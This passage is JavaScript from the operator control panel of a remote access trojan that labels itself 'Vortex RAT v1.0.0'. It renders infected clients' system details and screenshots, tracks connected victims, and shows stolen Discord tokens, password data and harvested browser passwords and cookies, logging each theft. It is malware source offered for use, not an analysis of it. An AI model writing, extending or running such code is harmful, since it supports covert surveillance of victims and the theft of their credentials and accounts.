    ['Total Memory', formatSize(info.totalMemory * 1024 * 1024)],
    ['Free Memory', formatSize(info.freeMemory * 1024 * 1024)],
    ['Local IP', info.localIp],
    ['Timezone', info.country],
    ['PID', info.pid],
    ['Uptime', Math.floor(info.uptime / 3600) + 'h ' + Math.floor((info.uptime % 3600) / 60) + 'm'],
    ['Node Version', info.nodeVersion],
    ['Home Dir', info.homeDir],
    ['Temp Dir', info.tmpDir]
  ];

  fields.forEach(([label, value]) => {
    grid.innerHTML += `<span class="assembly-label">${label}:</span><span style="color:var(--text-primary);font-size:12px;">${escapeHtml(String(value || 'N/A'))}</span>`;
  });
});

ipcRenderer.on('stats-update', (event, stats) => {
  document.getElementById('stat-online').textContent = stats.online;
  document.getElementById('stat-total').textContent = stats.total;
  document.getElementById('stat-upload').textContent = formatSize(stats.upload);
  document.getElementById('stat-download').textContent = formatSize(stats.download);
  document.getElementById('status-online').textContent = stats.online;
  document.getElementById('status-selected').textContent = stats.selected;
  document.getElementById('status-upload').textContent = formatSize(stats.upload);
  document.getElementById('status-download').textContent = formatSize(stats.download);
  document.getElementById('status-cpu').textContent = stats.cpu + '%';
  document.getElementById('status-memory').textContent = stats.memory + '%';

  document.getElementById('stat-tasks').textContent = stats.listeners;
});

function updateThumbnail(clientId, base64Data) {
  const container = document.getElementById('thumbnail-container');
  const emptyState = document.getElementById('thumbnail-empty');
  emptyState.style.display = 'none';

  let card = document.getElementById('thumb-' + clientId);
  const client = clients[clientId];
  const clientName = client ? `${client.username}@${client.ip}` : clientId;

  if (!card) {
    card = document.createElement('div');
    card.className = 'thumbnail-card';
    card.id = 'thumb-' + clientId;
    container.appendChild(card);
  }

  card.innerHTML = `
    <div class="thumbnail-preview" style="padding:0;">
      <img src="data:image/png;base64,${base64Data}" style="width:100%;height:100%;object-fit:cover;">
    </div>
    <div class="thumbnail-info">${escapeHtml(clientName)}</div>
  `;
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function escapeAttr(str) {
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

function formatSize(bytes) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function getFileIcon(filename) {
  const ext = filename.split('.').pop().toLowerCase();
  const icons = {
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️',
    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬',
    mp3: '🎵', wav: '🎵', flac: '🎵', ogg: '🎵',
    pdf: '📕', doc: '📘', docx: '📘', xls: '📗', xlsx: '📗',
    ppt: '📙', pptx: '📙',
    txt: '📄', md: '📄', log: '📄', csv: '📄',
    zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
    exe: '⚙️', msi: '⚙️', bat: '⚙️', cmd: '⚙️', ps1: '⚙️',
    js: '📜', py: '🐍', html: '🌐', css: '🎨', json: '📋',
    dll: '🔧', sys: '🔧', ini: '⚙️', cfg: '⚙️',
    iso: '💿', img: '💿'
  };
  return icons[ext] || '📄';
}

document.addEventListener('dragover', (e) => e.preventDefault());
document.addEventListener('drop', (e) => e.preventDefault());

ipcRenderer.on('discord-tokens', (event, { clientId, data }) => {
  console.log('Discord Tokens:', data);
  if (data && data.length > 0) {
    const text = data.map(t => `[${t.app}] ${t.token}`).join('\n');
    alert(`🎮 Discord Tokens Found (${data.length}):\n\n${text}`);
    addLogEntry('DATA', `Found ${data.length} Discord tokens from ${clientId}`);
  } else {
    showToast('❌ No Discord tokens found');
    addLogEntry('DATA', `No Discord tokens found on ${clientId}`);
  }
});

ipcRenderer.on('passwords', (event, { clientId, data }) => {
  console.log('Passwords:', data);
  if (data && data.length > 0) {
    const text = data.map(p => `App: ${p.app}\nNote: ${p.note}\nPath: ${p.path}`).join('\n\n');
    alert(`🔑 Passwords Data Found:\n\n${text}`);
    addLogEntry('DATA', `Found password data from ${clientId}`);
  } else {
    showToast('❌ No passwords recovered');
    addLogEntry('DATA', `No passwords found on ${clientId}`);
  }
});

ipcRenderer.on('browser-data-saved', (event, { clientId, count, path }) => {
  showToast(`🔑 Browser data saved! ${count} files from ${clientId}`);
  addLogEntry('DATA', `Saved ${count} browser files (passwords/cookies) from ${clientId} to ${path}`);
});

addLogEntry('SYSTEM', 'Vortex RAT v1.0.0 loaded');
addLogEntry('INFO', 'Ready — Configure ports and start the server');

console.log('Vortex RAT - Renderer loaded');
